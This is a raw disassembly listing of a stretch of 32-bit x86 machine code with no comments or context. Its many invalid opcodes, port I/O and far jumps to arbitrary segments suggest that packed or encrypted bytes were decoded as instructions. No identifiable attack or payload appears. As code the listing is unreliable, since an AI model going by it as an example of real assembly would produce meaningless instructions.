  40c1ba:	jnp    0x40c1f0
  40c1bc:	jl     0x40c1d0
  40c1be:	int3   
  40c1bf:	dec    esi
  40c1c0:	jg     0x40c207
  40c1c2:	or     BYTE PTR [esp+ebx*1],0xb4
  40c1c6:	int    0x99
  40c1c8:	sub    bh,0xe2
  40c1cb:	sbb    ecx,DWORD PTR es:[edi-0x2c]
  40c1cf:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1d1:	jp     0x40c1bb
  40c1d3:	mov    ds:0x702b7572,al
  40c1d8:	xchg   DWORD PTR [ebx+0x3c11a725],ebx
  40c1de:	pop    es
  40c1df:	mov    edi,0x5a88e984
  40c1e4:	imul   ebp,DWORD PTR [eax-0xd],0x61881f66
  40c1eb:	(bad)  
  40c1ec:	loopne 0x40c1ed
  40c1ee:	push   ecx
  40c1ef:	mov    gs,ebp
  40c1f1:	cmp    ebp,DWORD PTR [eax-0x52518a63]
  40c1f7:	sbb    al,0x28
  40c1f9:	push   eax
  40c1fa:	push   ss
  40c1fb:	ret    0xd456
  40c1fe:	dec    edx
  40c1ff:	pop    ss
  40c200:	retf   
  40c201:	inc    ebp
  40c202:	shl    al,0xd3
  40c205:	rcr    DWORD PTR [esp+ecx*1+0x1bcab7b],1
  40c20c:	fisttp DWORD PTR [eax]
  40c20e:	mov    eax,ds:0x98401556
  40c213:	leave  
  40c214:	rcl    DWORD PTR [eax-0x30826aee],0x1d
  40c21b:	sbb    edi,DWORD PTR [edx+0x10]
  40c21e:	ja     0x40c237
  40c220:	push   0xffffffbe
  40c222:	mov    DWORD PTR [ecx+0x2a],edx
  40c225:	push   edi
  40c226:	pop    esp
  40c227:	xchg   ebx,esi
  40c229:	jecxz  0x40c1f1
  40c22b:	push   ebx
  40c22c:	mov    edx,edx
  40c22e:	push   ss
  40c22f:	xchg   bh,bh
  40c231:	push   ss
  40c232:	mov    ch,BYTE PTR [edx]
  40c234:	xor    ebx,esp
  40c236:	fmulp  st(5),st
  40c238:	(bad)  [ecx]
  40c23a:	pusha  
  40c23b:	xchg   edx,ebp
  40c23d:	ficom  WORD PTR [edx+0x33aa7808]
  40c244:	inc    esi
  40c245:	fidiv  DWORD PTR [edx+ecx*2+0x42]
  40c249:	or     al,0xf5
  40c24b:	dec    edx
  40c24c:	ror    esi,0xc5
  40c24f:	fs push es
  40c251:	sub    ch,ah
  40c253:	xchg   esi,eax
  40c254:	mov    ah,0x49
  40c256:	sub    dh,BYTE PTR [esp+ebp*1-0x68]
  40c25a:	out    0x29,eax
  40c25c:	mov    ch,0xf4
  40c25e:	mov    ah,0x2
  40c260:	and    esp,eax
  40c262:	pop    esi
  40c263:	sbb    al,0xf9
  40c265:	les    ebp,FWORD PTR [eax+esi*1-0x5b]
  40c269:	pop    edi
  40c26a:	das    
  40c26b:	and    edx,DWORD PTR [ebx-0x61]
  40c26e:	and    BYTE PTR [eax+0x545843cc],ah
  40c274:	scas   eax,DWORD PTR es:[edi]
  40c275:	aad    0xec
  40c277:	sahf   
  40c278:	dec    edx
  40c279:	out    dx,al
  40c27a:	ss sahf 
  40c27c:	mov    eax,ds:0xb6084d78
  40c281:	shl    ebx,1
  40c283:	pop    ebp
  40c284:	call   0x1033:0xd010acc0
  40c28b:	dec    ebp
  40c28c:	neg    BYTE PTR [ecx+0x71]
  40c28f:	ins    BYTE PTR es:[edi],dx
  40c290:	push   esi
  40c291:	inc    ebx
  40c292:	repnz cmovbe edx,ebx
  40c296:	push   edx
  40c297:	xor    eax,0xd9731647
  40c29c:	mov    dh,0xe3
  40c29e:	stc    
  40c29f:	push   esp
  40c2a0:	push   0x67
  40c2a2:	sbb    bh,BYTE PTR [eax+0x75]
  40c2a5:	into   
  40c2a6:	daa    
  40c2a7:	out    0xfc,al
  40c2a9:	fidivr DWORD PTR [eax]
  40c2ab:	pop    ebx
  40c2ac:	(bad)  
  40c2ad:	or     BYTE PTR [eax+0x58],ah
  40c2b0:	pop    eax
  40c2b1:	adc    ebx,DWORD PTR [eax+0x75]
  40c2b4:	jp     0x40c237
  40c2b6:	rcl    DWORD PTR [ebx+0x6ffb9d71],cl
  40c2bc:	pop    ebp
  40c2bd:	jnp    0x40c312
  40c2bf:	jecxz  0x40c301
  40c2c1:	test   eax,0xfb8ee863
  40c2c6:	mov    bh,BYTE PTR [edi+0x128ea816]
  40c2cc:	dec    ecx
  40c2cd:	xor    esi,DWORD PTR [ecx+0x5792d18]
  40c2d3:	jne    0x40c2c8
  40c2d5:	out    dx,eax
  40c2d6:	pop    ebx
  40c2d7:	and    al,0x0
  40c2d9:	mov    DWORD PTR [edx-0x59],0x3ba383d5
  40c2e0:	inc    BYTE PTR [edx]
  40c2e2:	adc    eax,0x8c0f79dc
  40c2e7:	mov    bh,0x30
  40c2e9:	sbb    dh,BYTE PTR [edx-0x152de4ea]
  40c2ef:	sahf   
  40c2f0:	ins    DWORD PTR es:[edi],dx
  40c2f1:	mov    edi,0x5f8d9d78
  40c2f6:	(bad)  
  40c2f8:	arpl   WORD PTR [eax-0x581a995b],di
  40c2fe:	sbb    ch,bl
  40c300:	mov    ax,ds:0x6b5e36b3
  40c306:	lahf   
  40c307:	fisttp QWORD PTR [esi]
  40c309:	int    0xf4
  40c30b:	sbb    ebp,ebx
  40c30d:	mov    ah,0x12
  40c30f:	lock cmovp ecx,DWORD PTR [esi]
  40c313:	push   ecx
  40c314:	mov    ds:0x4dd57d75,al
  40c319:	retf   
  40c31a:	or     BYTE PTR [ebp+0x9],0x72
  40c31e:	daa    
  40c31f:	pop    edx
  40c320:	cmp    DWORD PTR [eax],0x71
  40c323:	mov    ah,0x65
  40c325:	jnp    0x40c339
  40c327:	aaa    
  40c328:	fmul   QWORD PTR [eax-0x77]
  40c32b:	inc    eax
  40c32c:	popa   
  40c32d:	sbb    eax,0x2d8586ec
  40c332:	cmp    DWORD PTR [ebx],ebp
  40c334:	jne    0x40c31f
  40c336:	mov    ebx,0x5b4462be
  40c33b:	mov    WORD PTR [ebp-0x75f45d0b],es
  40c341:	pop    ebp
  40c342:	adc    esi,DWORD PTR [ecx-0x777de39]
  40c348:	cmp    eax,0x748b2afd
  40c34d:	rcr    DWORD PTR [edi-0x344c44b5],1
  40c353:	cwde   
  40c354:	pop    edi
  40c355:	xchg   ebx,eax
  40c356:	jns    0x40c2df
  40c358:	repz (bad) 
  40c35a:	cmc    
  40c35b:	push   0xdca01172
  40c360:	fs (bad) 
  40c363:	ror    DWORD PTR [eax+0x3a],1
  40c366:	pop    ecx
  40c367:	and    dl,BYTE PTR [esi+0x5c]
  40c36a:	ins    DWORD PTR es:[edi],dx
  40c36b:	dec    edx
  40c36c:	jl     0x40c32b
  40c36e:	icebp  
  40c36f:	call   DWORD PTR [ebx+0x687daf2a]
  40c375:	or     cl,BYTE PTR [ecx-0x28]
  40c378:	fiadd  WORD PTR [ebp-0x59]
  40c37b:	and    eax,0xe07d5c5
  40c380:	pop    edi
  40c381:	test   dl,cl
  40c383:	add    DWORD PTR [ebp+0x40d97911],ecx
  40c389:	js     0x40c342
  40c38b:	adc    eax,0x2095ffd8
  40c390:	ret    
  40c391:	jp     0x40c325
  40c393:	xchg   BYTE PTR [ebp-0x52],bh
  40c396:	cmp    al,0x52
  40c398:	sub    eax,0xe0d0087
  40c39d:	loop   0x40c34c
  40c39f:	cmp    BYTE PTR [eax+0x15],0x4f
  40c3a3:	fimul  WORD PTR [edi+ebp*4]
  40c3a6:	add    BYTE PTR [ebp+0x17],bh
  40c3a9:	xchg   ecx,eax
  40c3aa:	ficomp WORD PTR [eax*2+0x3a2dc9f7]
  40c3b1:	sub    BYTE PTR [esi+0x5a],dh
  40c3b4:	or     eax,0xd2afee6c
  40c3b9:	mov    esp,0xffac8d71
  40c3be:	test   DWORD PTR [ecx-0x3d],edi
  40c3c1:	popa   
  40c3c2:	xchg   edx,eax
  40c3c3:	(bad)  [ecx-0x22a64e11]
  40c3c9:	lea    ecx,[esi+eax*4+0x72c4d35e]
  40c3d0:	(bad)  
  40c3d1:	popa   
  40c3d2:	inc    ecx
  40c3d3:	fwait
  40c3d4:	mov    dh,0x54
  40c3d6:	aas    
  40c3d7:	sbb    ebp,DWORD PTR [edx+0x2a376ecf]
  40c3dd:	pop    ebp
  40c3de:	(bad)  
  40c3e0:	je     0x40c41f
  40c3e2:	aam    0xed
  40c3e4:	adc    BYTE PTR [ecx-0xde9cd6],ch
  40c3ea:	mov    ah,BYTE PTR [ebx-0x26d55c17]
  40c3f0:	inc    ebx
  40c3f1:	mov    ds:0x49f7fbc5,eax
  40c3f6:	enter  0xc340,0x6
  40c3fa:	nop
  40c3fb:	xchg   ebx,eax
  40c3fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3fd:	cmp    ecx,DWORD PTR [esi-0x18]
  40c400:	outs   dx,DWORD PTR ds:[esi]
  40c401:	stos   BYTE PTR es:[edi],al
  40c402:	in     al,0xe4
  40c404:	push   eax
  40c405:	push   cs
  40c406:	add    al,0x7d
  40c408:	mov    esp,ds
  40c40a:	push   edi
  40c40b:	call   0x778faf00
  40c410:	loope  0x40c3ad
  40c412:	add    al,0xb7
  40c414:	mov    DWORD PTR [esi],edi
  40c416:	add    DWORD PTR gs:[edx+0x4082ce2d],edi
  40c41d:	cs sbb dl,bl
  40c420:	in     al,dx
  40c421:	push   edi
  40c422:	xchg   BYTE PTR [edi],dh
  40c424:	pop    edi
  40c425:	sbb    BYTE PTR [edi-0x18],0xad
  40c429:	jg     0x40c3f6
  40c42b:	ror    BYTE PTR [bp+di-0x1643],0xd6
  40c431:	jle    0x40c473
  40c433:	jge    0x40c4a0
  40c435:	sar    DWORD PTR [eax],cl
  40c437:	jmp    0x7aa7453b
  40c43c:	xor    eax,0x4dbf3fc3
  40c441:	xchg   ecx,eax
  40c442:	das    
  40c443:	adc    DWORD PTR [ecx-0x115ab699],ebp
  40c449:	jbe    0x40c483
  40c44b:	scas   eax,DWORD PTR es:[edi]
  40c44c:	call   edx
  40c44e:	test   DWORD PTR ds:[ecx+0x29],ebp
  40c452:	inc    ebx
  40c453:	scas   eax,DWORD PTR es:[edi]
  40c454:	imul   ebx,DWORD PTR [ebp+ebp*2+0x3a5b984c],0x74807a37
  40c45f:	jb     0x40c406
  40c461:	retf   0xc9d0
  40c464:	add    DWORD PTR [eax-0x18e305e6],0xa711ded9
  40c46e:	or     eax,0xe3e5ccb
  40c473:	ret    0xec5e
  40c476:	push   ds
  40c477:	xor    DWORD PTR [esi-0x1b],esp
  40c47a:	add    al,0xd8
  40c47c:	sub    edx,ebx
  40c47e:	add    al,0x8b
  40c480:	ror    DWORD PTR [edx+0x58],cl
  40c483:	pushf  
  40c484:	pusha  
  40c485:	push   edi
  40c486:	dec    esp
  40c487:	xchg   edx,eax
  40c488:	pop    eax
  40c489:	rcl    BYTE PTR [ecx-0x64052a06],cl
  40c48f:	mov    dh,0x6
  40c491:	cmp    BYTE PTR [ecx-0x5152ff6f],bh
  40c497:	in     al,dx
  40c498:	sbb    BYTE PTR [edx],dl
  40c49a:	dec    esi
  40c49b:	mov    dl,0x1f
  40c49d:	aas    
  40c49e:	stos   DWORD PTR es:[edi],eax
  40c49f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4a0:	loopne 0x40c458
  40c4a2:	sbb    dh,ah
  40c4a4:	adc    ebx,DWORD PTR [ebx-0x55]
  40c4a7:	jecxz  0x40c48c
  40c4a9:	daa    
  40c4aa:	rol    DWORD PTR [edx-0x42],1
  40c4ad:	test   eax,0x8cd36d75
  40c4b2:	lods   eax,DWORD PTR ds:[esi]
  40c4b3:	and    BYTE PTR [ebx+0x1fb38efe],0x55
  40c4ba:	icebp  
  40c4bb:	test   al,0x5b
  40c4bd:	add    bh,BYTE PTR [ebx]
  40c4bf:	push   ebx
  40c4c0:	aaa    
  40c4c1:	sub    BYTE PTR [esp],ah
  40c4c4:	dec    esi
  40c4c5:	(bad)  
  40c4c6:	jp     0x40c46b
  40c4c8:	imul   eax,DWORD PTR ds:0xc0fae349,0x1275d6a2
  40c4d2:	adc    eax,0xc8051ce4
  40c4d7:	jae    0x40c4f8
  40c4d9:	cmp    DWORD PTR [edx-0x54],0x26525c27
  40c4e0:	das    
  40c4e1:	data16 (bad) 
  40c4e4:	cmp    esp,DWORD PTR [edi-0x24df8d1d]
  40c4ea:	sub    cl,BYTE PTR [ecx-0x3e]
  40c4ed:	out    0xdf,eax
  40c4ef:	pusha  
  40c4f0:	adc    BYTE PTR [edi-0xb],0x94
  40c4f4:	popf   
  40c4f5:	js     0x40c524
  40c4f7:	adc    edi,DWORD PTR [ecx-0x1f]
  40c4fa:	test   BYTE PTR [edi-0x3f],cl
  40c4fd:	test   DWORD PTR gs:[eax+eax*2+0x17b298ad],eax
  40c505:	xchg   esp,eax
  40c506:	push   ss
  40c507:	mov    DWORD PTR [edx],edx
  40c509:	sbb    ch,BYTE PTR [esi]
  40c50b:	cmc    
  40c50c:	mov    al,ds:0x7e9336ee
  40c511:	and    ch,bh
  40c513:	gs retf 
  40c515:	jb     0x40c4d9
  40c517:	pop    esi
  40c518:	repz and ah,ch
  40c51b:	aas    
  40c51c:	in     al,0xdb
  40c51e:	sub    dh,ch
  40c520:	xchg   esp,eax
  40c521:	in     eax,dx
  40c522:	fisttp QWORD PTR [esi]
  40c524:	loopne 0x40c4ba
  40c526:	sub    ah,BYTE PTR [ebx]
  40c528:	mov    al,ds:0xf3049b12
  40c52d:	pop    ebp
  40c52e:	mov    es,WORD PTR [ebp+ecx*1+0x50]
  40c532:	mov    eax,ds:0xf58ed3aa
  40c537:	jle    0x40c4be
  40c539:	test   BYTE PTR [ebx-0x5f9e1f62],bh
  40c53f:	call   0xfb5c6132
  40c544:	(bad)  
  40c545:	imul   ecx,DWORD PTR [edx-0x3f],0x59
  40c549:	push   ds
  40c54a:	fwait
  40c54b:	xor    eax,0x54a31807
  40c550:	es push cs
  40c552:	mov    dl,0xfc
  40c554:	push   0xb46aeeec
  40c559:	enter  0x421e,0xd6
  40c55d:	sbb    al,0x2a
  40c55f:	sbb    eax,0xb19f23f0
  40c564:	sub    al,ch
  40c566:	dec    edi
  40c567:	out    0xa,eax
  40c569:	arpl   dx,cx
  40c56b:	outs   dx,DWORD PTR ds:[esi]
  40c56c:	add    ah,BYTE PTR [ecx+eiz*8-0xd142293]
  40c573:	sbb    eax,0x45c3e527
  40c578:	xchg   edx,eax
  40c579:	arpl   WORD PTR [ebp-0xd39bb03],ax
  40c57f:	in     al,dx
  40c580:	lea    ecx,[esi]
  40c582:	mov    dl,0x31
  40c584:	and    al,0xf
  40c586:	cli    
  40c587:	pop    edx
  40c588:	jae    0x40c519
  40c58a:	jns    0x40c56c
  40c58c:	inc    esp
  40c58d:	sub    DWORD PTR [esi+0xce63efc],ebp
  40c593:	fiadd  DWORD PTR [edx-0x2b10323a]
  40c599:	xchg   BYTE PTR [edx+0xfe148b5],bl
  40c59f:	lahf   
  40c5a0:	dec    eax
  40c5a1:	mov    WORD PTR [edi-0x1d],ds
  40c5a4:	lods   eax,DWORD PTR ds:[esi]
  40c5a5:	pop    ebp
  40c5a6:	loop   0x40c5c3
  40c5a8:	cli    
  40c5a9:	cmp    DWORD PTR [edi],edi
  40c5ab:	clc    
  40c5ac:	rcl    esp,0x99
  40c5af:	lods   al,BYTE PTR ds:[esi]
  40c5b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5b1:	pop    es
  40c5b2:	les    edx,FWORD PTR [ebx+0x29]
  40c5b5:	int    0x1e
  40c5b7:	inc    edi
  40c5b8:	clc    
  40c5b9:	push   ebx
  40c5ba:	push   ecx
  40c5bb:	add    al,0xc4
  40c5bd:	lock push edi
  40c5bf:	adc    edx,DWORD PTR [ebx+0xe]
  40c5c2:	lea    eax,[eax+0x7b]
  40c5c5:	jecxz  0x40c5ae
  40c5c7:	mov    edx,0xa2af528f
  40c5cc:	sub    esi,DWORD PTR fs:[edx-0x771af423]
  40c5d3:	adc    DWORD PTR [eax+0x7d381d58],ebp
  40c5d9:	mov    dl,0xba
  40c5db:	sbb    eax,0x897534b8
  40c5e0:	lock jb 0x40c5cd
  40c5e3:	sub    eax,0x65d6e9a9
  40c5e8:	mov    ah,0x32
  40c5ea:	sub    al,0xf3
  40c5ec:	fcomp  QWORD PTR [ebp-0xd]
  40c5ef:	out    0x45,eax
  40c5f1:	inc    ebx
  40c5f2:	ja     0x40c5e7
  40c5f4:	repnz arpl WORD PTR [ebx-0x2f],cx
  40c5f8:	stc    
  40c5f9:	fld    TBYTE PTR [esi+eiz*8+0x491e61fa]
  40c600:	into   
  40c601:	lds    ebp,FWORD PTR [ebp+0x24]
  40c604:	adc    ecx,ebp
  40c606:	mov    DWORD PTR [edi],ecx
  40c608:	popf   
  40c609:	pop    ss
  40c60a:	dec    ecx
  40c60b:	dec    esp
  40c60c:	sub    ah,BYTE PTR [ebp+0xb02a0c2]
  40c612:	xchg   esi,eax
  40c613:	call   0xace2:0xe78d6f27
  40c61a:	in     al,0xa3
  40c61c:	adc    ecx,edi
  40c61e:	adc    ah,al
  40c620:	repnz cdq 
  40c622:	push   esp
  40c623:	dec    ebx
  40c624:	mov    ebx,0x308e2e0f
  40c629:	in     eax,dx
  40c62a:	jg     0x40c62b
  40c62c:	and    eax,0xa475dcd9
  40c631:	mov    gs,WORD PTR [edx+0x7026ca16]
  40c637:	out    dx,eax
  40c638:	test   al,0x50
  40c63a:	test   BYTE PTR [eax],0xbe
  40c63d:	mov    al,ds:0xb51a3d8e
  40c642:	cmc    
  40c643:	mov    dl,0x59
  40c645:	sub    DWORD PTR [ebx+0x2e],eax
  40c648:	call   DWORD PTR [ecx+0x23]
  40c64b:	jmpw   0x6639
  40c64f:	add    DWORD PTR [ecx-0x3ce3a1af],eax
  40c655:	sbb    BYTE PTR [edx+ecx*8-0x49],0xd0
  40c65a:	les    esi,FWORD PTR [ebp+0x3555c4a7]
  40c660:	jbe    0x40c677
  40c662:	add    al,0x6b
  40c664:	mov    ds:0x339dc266,eax
  40c669:	mov    WORD PTR [eax+edx*8-0x4a],?
  40c66d:	mov    ch,0xea
  40c66f:	mov    eax,ds:0x10abc1fd
  40c674:	dec    esp
  40c675:	pop    edi
  40c676:	inc    eax
  40c677:	dec    ecx
  40c678:	and    DWORD PTR [ebx-0x32d428d4],edx
  40c67e:	paddsb mm0,mm6
  40c681:	cmp    eax,DWORD PTR [edi]
  40c683:	sub    eax,0x65fbbb0d
  40c688:	stos   BYTE PTR es:[edi],al
  40c689:	in     al,dx
  40c68a:	jmp    0xa2dc388a
  40c68f:	dec    esi
  40c690:	and    eax,0xd3a69c7d
  40c695:	xor    DWORD PTR [esi],esi
  40c697:	xor    esi,DWORD PTR [edi]
  40c699:	ins    DWORD PTR es:[edi],dx
  40c69a:	xor    BYTE PTR [esi+0x2a],0x32
  40c69e:	mov    ch,0x7
  40c6a0:	rol    dh,cl
  40c6a2:	sbb    al,0x8d
  40c6a4:	mov    BYTE PTR [edx-0x331dab6b],al
  40c6aa:	xor    BYTE PTR [ebx],ah
  40c6ac:	es ret 0xc41a
  40c6b0:	mov    ebp,ebx
  40c6b2:	cmp    ah,BYTE PTR ds:0x90ff0493
  40c6b8:	dec    ebx
  40c6b9:	mov    bl,0xcb
  40c6bb:	push   ecx
  40c6bc:	mov    cl,0x58
  40c6be:	push   0xffffffa8
  40c6c0:	jg     0x40c664
  40c6c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6c3:	dec    esi
  40c6c4:	inc    ebx
  40c6c5:	les    esi,FWORD PTR [ebx-0x394c843a]
  40c6cb:	fidiv  DWORD PTR [eax+edi*4]
  40c6ce:	or     DWORD PTR [ebp-0x3f3de8bb],esi
  40c6d4:	xchg   edx,eax
  40c6d5:	sub    al,0xa3
  40c6d7:	mov    al,ds:0x738935ef
  40c6dc:	ins    DWORD PTR es:[edi],dx
  40c6dd:	loopne 0x40c6a0
  40c6df:	or     edx,DWORD PTR [ebx]
  40c6e1:	xor    BYTE PTR [edi+edi*1],dl
  40c6e4:	out    0x6d,eax
  40c6e6:	shl    DWORD PTR [ebx-0x59],cl
  40c6e9:	sub    al,0x56
  40c6eb:	jae    0x40c743
  40c6ed:	pop    ds
  40c6ee:	push   edx
  40c6ef:	push   esp
  40c6f0:	sbb    bh,al
  40c6f2:	loop   0x40c72e
  40c6f4:	in     eax,dx
  40c6f5:	arpl   WORD PTR [ebp+ecx*8-0x6e057bb7],bp
  40c6fc:	ins    DWORD PTR es:[edi],dx
  40c6fd:	and    al,0xe
  40c6ff:	mov    al,0xa4
  40c701:	cmp    al,0x5f
  40c703:	mov    ecx,edx
  40c705:	mov    dh,0x77
  40c707:	jmp    0x40c6ad
  40c709:	push   ebp
  40c70a:	ret    
  40c70b:	mov    ah,0xf0
  40c70d:	mov    ebp,0x1a526dfa
  40c712:	dec    ebx
  40c713:	ret    0x73ff
  40c716:	pop    ecx
  40c717:	enter  0xd40b,0x71
  40c71b:	jno    0x40c776
  40c71d:	out    0x2c,al
  40c71f:	dec    edx
  40c720:	shr    BYTE PTR ds:0x86e6fa5,cl
  40c726:	leave  
  40c727:	jnp    0x40c74a
  40c729:	repz test DWORD PTR [ecx+0x5cae8537],0xf7f46140
  40c734:	outs   dx,DWORD PTR ds:[esi]
  40c735:	or     DWORD PTR [ebp+0x3e88abd6],0x10
  40c73c:	and    eax,0x9cf2a367
  40c741:	adc    BYTE PTR [ecx+0x70d3cef5],cl
  40c747:	in     eax,dx
  40c748:	clc    
  40c749:	daa    
  40c74a:	outs   dx,BYTE PTR ds:[esi]
  40c74b:	add    BYTE PTR [ebx+0x196283d2],al
  40c751:	aas    
  40c752:	pop    eax
  40c753:	out    0xe6,al
  40c755:	mov    ds:0xdaf1646d,al
  40c75a:	lods   al,BYTE PTR ds:[esi]
  40c75b:	push   eax
  40c75c:	jnp    0x40c762
  40c75e:	out    0x1,eax
  40c760:	and    eax,0x49a93ea6
  40c765:	ja     0x40c781
  40c767:	test   BYTE PTR [esi],bh
  40c769:	retf   0x516c
  40c76c:	int    0x61
  40c76e:	in     al,dx
  40c76f:	test   eax,0x987af0f6
  40c774:	inc    edi
  40c775:	dec    eax
  40c776:	push   cs
  40c777:	pushf  
  40c778:	lods   al,BYTE PTR ds:[esi]
  40c779:	mov    cl,0x1b
  40c77b:	js     0x40c738
  40c77d:	scas   al,BYTE PTR es:[edi]
  40c77e:	pop    edi
  40c77f:	out    dx,eax
  40c780:	pop    edx
  40c781:	jb     0x40c7dd
  40c783:	adc    DWORD PTR [edx],eax
  40c785:	lds    eax,FWORD PTR [esi+0x29]
  40c788:	and    eax,0xc8c9233a
  40c78d:	in     al,dx
  40c78e:	add    eax,0x6826653d
  40c793:	sahf   
  40c794:	sub    al,BYTE PTR [eax-0x1e]
  40c797:	mov    ds,WORD PTR [edx-0x6]
  40c79a:	mov    ecx,DWORD PTR [ebx]
  40c79c:	(bad)  
  40c79d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c79e:	fs stc 
  40c7a0:	fidivr WORD PTR [ebx-0x10]
  40c7a3:	push   ebp
  40c7a4:	inc    esi
  40c7a5:	jge    0x40c760
  40c7a7:	push   ebp
  40c7a8:	cmp    al,0x43
  40c7aa:	cmp    eax,0xf893cead
  40c7af:	adc    al,0x5b
  40c7b1:	xor    bh,BYTE PTR [edx+0x37824b2d]
  40c7b7:	add    ebx,0xc3df6974
  40c7bd:	bound  ebp,QWORD PTR [eax+0x735e18c]
  40c7c3:	lds    ebp,FWORD PTR [edx]
  40c7c5:	inc    esp
  40c7c6:	ds out dx,al
  40c7c8:	cmp    dl,BYTE PTR gs:[bp+di+0x2305]
  40c7ce:	mov    ah,0x55
  40c7d0:	mov    al,ds:0x1e7b4ca4
  40c7d5:	icebp  
  40c7d6:	push   ebp
  40c7d7:	sub    dh,BYTE PTR [ecx]
  40c7d9:	stos   BYTE PTR es:[edi],al
  40c7da:	push   cs
  40c7db:	dec    ebx
  40c7dc:	xchg   ebp,eax
  40c7dd:	fld    DWORD PTR [eax-0x23ec1e0b]
  40c7e3:	sahf   
  40c7e4:	sbb    eax,0xe62ebac7
  40c7e9:	push   edx
  40c7ea:	xchg   edi,eax
  40c7eb:	call   0x9b900614
  40c7f0:	adc    BYTE PTR [ecx+0x3a],0x3a
  40c7f4:	punpckldq mm6,DWORD PTR [ebp+ebx*8-0x3b863a2]
  40c7fc:	cmc    
  40c7fd:	adc    BYTE PTR [ecx+ebp*1-0x50772ec9],bl
  40c804:	mov    ebx,0x50892435
  40c809:	ds enter 0xa0d0,0xeb
  40c80e:	mov    ds:0x3e52e85d,al
  40c813:	ins    DWORD PTR es:[edi],dx
  40c814:	xor    al,0x3a
  40c816:	pop    ebp
  40c817:	push   cs
  40c818:	xor    eax,0xa268382c
  40c81d:	xor    eax,0xddf49e50
  40c822:	js     0x40c895
  40c824:	adc    DWORD PTR [edx+edx*1+0x7079adb3],eax
  40c82b:	enter  0xcf9e,0xf9
  40c82f:	add    al,0xb7
  40c832:	jno    0x40c80e
  40c834:	dec    ecx
  40c835:	ja     0x40c7ea
  40c837:	out    0x90,al
  40c839:	push   ebx
  40c83a:	shl    BYTE PTR [ebx-0x4c55274d],0x74
  40c841:	mov    al,ds:0xe23c6b89
  40c846:	sahf   
  40c847:	leave  
  40c848:	dec    esi
  40c849:	aam    0xb1
  40c84b:	cmp    DWORD PTR [ecx+0x3c],ebp
  40c84e:	mov    ecx,0x11e645c1
  40c853:	sbb    DWORD PTR [edx],0xfffffffe
  40c856:	push   esp
  40c857:	fimul  WORD PTR [ebx-0x1b2afd1e]
  40c85d:	sbb    eax,0xa4bf130c
  40c862:	popf   
  40c863:	jae    0x40c837
  40c865:	nop    DWORD PTR [ebx-0x79808737]
  40c86c:	data16 loope 0x40c894
  40c86f:	icebp  
  40c870:	aaa    
  40c871:	mov    ebx,0xc7887df9
  40c876:	lds    edi,FWORD PTR [eax+eax*2+0x14]
  40c87a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c87b:	sub    DWORD PTR [esi-0x666cf239],ebp
  40c881:	or     al,0x41
  40c883:	(bad)  
  40c885:	shr    DWORD PTR [edi+eiz*1+0x5a],0x2b
  40c88a:	(bad)  
  40c88b:	out    dx,al
  40c88c:	sbb    BYTE PTR [ebx+0x4f],cl
  40c88f:	sbb    al,0x8f
  40c891:	repnz stos BYTE PTR es:[edi],al
  40c893:	push   cs
  40c894:	push   cs
  40c895:	jp     0x40c845
  40c897:	lahf   
  40c898:	sub    BYTE PTR [edi+0x618b454],0x52
  40c89f:	push   ebp
  40c8a0:	sub    DWORD PTR [ebx-0xb8d584e],ebx
  40c8a6:	mov    ecx,0xbb867b5d
  40c8ab:	test   BYTE PTR [edi],ch
  40c8ad:	xchg   ebp,eax
  40c8ae:	and    bh,BYTE PTR [edx-0x42]
  40c8b1:	in     eax,0x2d
  40c8b3:	cmp    BYTE PTR [esi-0x7a43635],bl
  40c8b9:	sti    
  40c8ba:	mov    eax,ds:0x14db04e0
  40c8bf:	xchg   edx,eax
  40c8c0:	jmp    0x40c871
  40c8c2:	inc    ebx
  40c8c3:	xor    edi,DWORD PTR [esi]
  40c8c5:	fstp   QWORD PTR [ecx+0x63a83e54]
  40c8cb:	mov    edi,0x23b25286
  40c8d0:	sbb    al,0x1e
  40c8d2:	daa    
  40c8d3:	lods   eax,DWORD PTR ds:[esi]
  40c8d4:	(bad)  
  40c8d5:	lock cmp dl,ch
  40c8d8:	push   ebp
  40c8d9:	mov    ah,0x36
  40c8dc:	push   eax
  40c8dd:	jb     0x40c914
  40c8df:	cli    
  40c8e0:	in     eax,dx
  40c8e1:	(bad)  
  40c8e2:	jmp    0x9b49:0x7e52f51a
  40c8e9:	push   ebp
  40c8ea:	fcmovbe st,st(4)
  40c8ec:	pushf  
  40c8ed:	outs   dx,BYTE PTR ds:[esi]
  40c8ee:	inc    esp
  40c8ef:	xchg   DWORD PTR [edx],edx
  40c8f1:	pop    ebp
  40c8f2:	mov    bh,0xec
  40c8f4:	out    dx,eax
  40c8f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8f6:	sar    DWORD PTR [eax],0x19
  40c8f9:	daa    
  40c8fa:	jne    0x40c965
  40c8fc:	icebp  
  40c8fd:	and    BYTE PTR [esi+0x14],ch
  40c900:	adc    al,0x88
  40c902:	lods   al,BYTE PTR ds:[esi]
  40c903:	inc    esi
  40c904:	mov    ah,0xd3
  40c906:	mov    ah,0x62
  40c908:	shl    ebx,0x1a
  40c90b:	fwait
  40c90c:	outs   dx,DWORD PTR ds:[esi]
  40c90d:	dec    esi
  40c90e:	into   
  40c90f:	sbb    BYTE PTR [edx-0x4dda61b2],bh
  40c915:	loop   0x40c8c7
  40c917:	pop    edx
  40c918:	sub    DWORD PTR ds:0xbf915878,esi
  40c91e:	cmp    edx,DWORD PTR [ebx]
  40c920:	add    ebx,edi
  40c922:	fsubr  DWORD PTR [edi-0x11]
  40c925:	call   0xe4d:0xcfc50b4f
  40c92c:	inc    esp
  40c92d:	xor    al,0xf6
  40c92f:	xor    al,0x31
  40c931:	in     eax,dx
  40c932:	xchg   edx,eax
  40c933:	pand   mm4,QWORD PTR [edx-0x101033e3]
  40c93a:	mov    ds:0x41f0c6b9,al
  40c93f:	mov    dh,0xf
  40c941:	repz fsubr st(7),st
  40c944:	shl    BYTE PTR [ecx+0x71],0xae
  40c948:	fdiv   QWORD PTR [ebx-0x6ed3c1f1]
  40c94e:	jae    0x40c910
  40c950:	int3   
  40c951:	sbb    cl,BYTE PTR [eax]
  40c953:	mov    ds:0x8e2e9a38,eax
  40c958:	cmp    cl,ch
